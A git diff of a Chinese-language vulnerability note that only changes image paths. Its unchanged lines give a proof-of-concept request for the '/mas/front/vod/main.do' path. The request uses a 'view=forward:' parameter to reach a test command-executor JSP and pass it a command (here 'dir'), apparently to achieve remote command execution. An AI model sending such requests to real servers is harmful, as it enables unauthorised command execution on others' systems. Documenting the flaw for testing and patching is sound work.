@@ -20,7 +20,7 @@
 
 主页面
 
-![image-20230314084307993](images/image-20230314084307993.png)
+![image-20230314084307993](../.gitbook/assets/image-20230314084307993.png)
 
 验证POC
 
@@ -28,4 +28,4 @@
 /mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=dir&workDir=&pathEnv=&libPathEnv=
 ```
 
-![image-20230314084331676](images/image-20230314084331676.png)
+![image-20230314084331676](../.gitbook/assets/image-20230314084331676.png)
